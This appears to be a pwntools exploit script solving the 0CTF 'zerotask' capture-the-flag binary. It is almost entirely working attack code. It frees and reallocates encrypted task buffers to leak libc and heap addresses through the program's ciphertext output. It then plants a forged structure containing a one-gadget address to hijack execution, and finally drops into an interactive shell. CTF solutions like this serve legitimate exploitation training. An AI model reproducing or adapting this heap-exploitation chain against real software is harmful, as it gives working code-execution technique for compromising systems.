from pwn import *
from Crypto.Cipher import AES

def encrypt(key, raw, iv):
	cipher = AES.new(key, AES.MODE_CBC, iv)
	return cipher.encrypt(raw).encode("hex")

def decrypt(key, enc, iv):
	cipher = AES.new(key, AES.MODE_CBC, iv)
	return cipher.decrypt(enc).encode('hex')

r = process("./zerotask", env = {'LD_LIBRARY_PATH':'/home/poortho/ctf/0ctf/'})
#gdb.attach(r)
#r = remote("111.186.63.201", 10001)
#print r.recvuntil("Choice: ")
def add_task(id_num, encrypt, key, iv, size, data):
	r.sendline('1')
	#print r.recvuntil("id :")
	r.sendline(str(id_num))
	#print r.recvuntil("(2): ")
	r.sendline(str(encrypt))
	#print r.recvuntil("Key :")
	r.send(key)
	#print r.recvuntil("IV :")
	r.send(iv)
	#print r.recvuntil("Size :")
	r.sendline(str(size))
	#print r.recvuntil("Data :")
	r.send(data)
	#print r.recvuntil("Choice: ")

def remove_task(taskid):
	r.sendline('2')
	r.sendline(str(taskid))

add_task(0, 1, '\x00'*0x20, '\x00'*0x10, 0x410, '\x00'*0x410)
#print r.recvuntil("Choice: ")
add_task(1, 1, '\x00'*0x20, '\x00'*0x10, 0x10, '\x00'*0x10)
#print r.recvuntil("Choice: ")
r.sendline('3')
r.sendline('0')
remove_task(0)
add_task(2, 1, '\x00'*0x20, '\x00'*0x10, 0x10, '\x00'*0x1)
print r.recvuntil("Ciphertext: \n")
libc_leak = r.recvline() + r.recvline()
libc_leak = decrypt('\x00'*0x20, libc_leak.replace('\n','').replace(' ','').decode('hex'), '\x00'*0x10)
print libc_leak
libc_leak = u64(libc_leak.decode('hex')[8:16])
print hex(libc_leak)
libc_base = libc_leak - 0x3ec090 #local
r.send('\x00'*(0x10-1))
#print r.recvuntil("Choice: ")
add_task(3, 1, '\x00'*0x20, '\x00'*0x10, 0x10, '\x00'*0x10)
#print r.recvuntil("Choice: ")
add_task(4, 1, '\x00'*0x20, '\x00'*0x10, 0x10, '\x00'*0x10)
#print r.recvuntil("Choice: ")
remove_task(3)
r.sendline('3')
r.sendline('4')
remove_task(4)
add_task(5, 1, '\x00'*0x20, '\x00'*0x10, 0x10, '')
print r.recvuntil("Ciphertext: \n")
heap_leak = r.recvline() + r.recvline()
heap_leak = decrypt('\x00'*0x20, heap_leak.replace('\n','').replace(' ','').decode('hex'), '\x00'*0x10)
heap_leak = u64(heap_leak.decode('hex')[:8])
r.send('\x00'*0x10)

magic = libc_base + 0x4f322
payload1 = ''
payload1 += p64(0x00000010000001ab)
payload1 += p64(0x0000001000000020)
payload1 += p64(0x0000000000001002)
payload1 += p64(magic)*3
payload1 += p64(0x108)
add_task(7, 1, '\x00'*0x20, '\x00'*0x10, 0x38, payload1)
add_task(6, 1, '\x00'*0x20, '\x00'*0x10, 0x10, '\x00'*0x10)
add_task(8, 1, '\x00'*0x20, '\x00'*0x10, 0x10, '\x00'*0x10)
r.sendline('3')
r.sendline('6')
remove_task(6)
remove_task(8)
add_task(8, 1, '\x00'*0x20, '\x00'*0x10, 0xa0, p64(heap_leak + 368))
print hex(libc_base)
print hex(heap_leak)
print hex(magic)
#break here 0x7ffff789389d
r.interactive()